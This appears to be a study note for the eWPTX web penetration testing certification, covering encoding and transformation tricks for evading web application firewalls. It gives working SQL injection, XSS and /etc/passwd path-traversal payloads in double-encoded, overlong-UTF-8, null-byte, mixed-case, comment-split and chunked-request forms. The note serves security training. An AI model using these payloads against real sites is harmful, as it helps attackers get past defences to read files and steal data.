2026-02-06

Status:

Tags: [[eWPTX]] [[Bypassing Filters & Evasion]]
###### Prerequisites: [[WAF Fingerprinting & Detection]]
# Encoding & Transformation Bypasses

## Core Idea

Filters often check input at one stage, but the backend processes it differently. Encoding mismatches between the WAF and the application create bypass opportunities.

---

## URL Encoding

### Single encoding

Standard percent-encoding. Most WAFs decode this before inspection.

```
' → %27
< → %3C
> → %3E
/ → %2F
space → %20 or +
```

### Double encoding

Encode the `%` itself. Works when the WAF decodes once, but the app decodes twice.

```
' → %27 → %2527
< → %3C → %253C
/ → %2F → %252F
```

### Triple encoding

Rare but effective against layered proxies:

```
' → %27 → %2527 → %25252527
```

### Test example

```
# Normal (blocked)
/page?id=1' OR 1=1--

# Double encoded (may bypass)
/page?id=1%2527%20OR%201%253D1--
```

---

## Unicode & UTF-8 Tricks

### Overlong UTF-8

Represent characters using more bytes than needed. Some parsers normalize these.

```
/ (U+002F) normal:    2F
/ overlong 2-byte:    C0 AF
/ overlong 3-byte:    E0 80 AF
```

```
# Path traversal with overlong encoding
..%c0%af..%c0%afetc/passwd
```

### Fullwidth Unicode

Use fullwidth equivalents (U+FF00 range):

```
< → ＜ (U+FF1C)
> → ＞ (U+FF1E)
' → ＇ (U+FF07)
```

### Homoglyphs

Visually similar characters from different Unicode blocks. Useful when filters match exact characters but the app normalizes.

---

## HTML Entity Encoding

Useful for XSS filter bypass when input is reflected in HTML context:

```html
<!-- Named entities -->
&lt;script&gt;  →  <script>

<!-- Decimal entities -->
&#60;script&#62;  →  <script>

<!-- Hex entities -->
&#x3C;script&#x3E;  →  <script>

<!-- With padding zeros (often bypasses regex) -->
&#0000060;  →  <
&#x000003C;  →  <
```

---

## Null Byte Injection

Insert `%00` to confuse string handling:

```
# May terminate string at WAF but not at app
/page?file=../../etc/passwd%00.jpg

# In PHP < 5.3.4, null byte truncated file paths
include($_GET['file'] . '.php');
# ?file=../../etc/passwd%00
```

---

## Case Manipulation

Some filters are case-sensitive while the backend is not:

```sql
-- Blocked
UNION SELECT * FROM users

-- Bypass attempts
UnIoN SeLeCt * FrOm users
uNiOn aLl sElEcT * fRoM users
```

```html
<!-- Blocked -->
<script>alert(1)</script>

<!-- Bypass -->
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>
```

---

## Comment Insertion

Break up keywords with comments that the parser ignores:

```sql
-- SQL: inline comments
UN/**/ION SEL/**/ECT * FROM users
/*!50000UNION*/ /*!50000SELECT*/ * FROM users

-- MySQL version comments (executed only on version >= 5.0)
/*!50000SELECT*/ /*!50000password*/ FROM users
```

```html
<!-- HTML: break event handlers -->
<img src=x on<>error=alert(1)>
```

---

## Whitespace Alternatives

Replace spaces with alternative whitespace characters:

```sql
-- Tab (%09)
UNION%09SELECT%09*%09FROM%09users

-- Newline (%0a)
UNION%0aSELECT%0a*%0aFROM%0ausers

-- Carriage return (%0d)
UNION%0dSELECT

-- Vertical tab (%0b), form feed (%0c)
UNION%0bSELECT
```

---

## Content-Type Manipulation

Change the Content-Type to bypass body inspection rules:

```
# Standard (inspected)
Content-Type: application/x-www-form-urlencoded

# May bypass inspection
Content-Type: multipart/form-data; boundary=----
Content-Type: text/plain
Content-Type: application/json
```

---

## Chunked Transfer Encoding

Split the request body into chunks to evade pattern matching:

```http
POST /page HTTP/1.1
Transfer-Encoding: chunked

3
id=
4
1 UN
5
ION S
6
ELECT
1
*
0
```

---

## Diagram

![[Pics/bypass/encoding-bypass-pipeline.svg]]

---

## Testing Strategy

1. Start with single URL encoding
2. Try double encoding if blocked
3. Test case variations
4. Insert comments into keywords
5. Try alternative whitespace
6. Test Content-Type changes
7. Combine multiple techniques
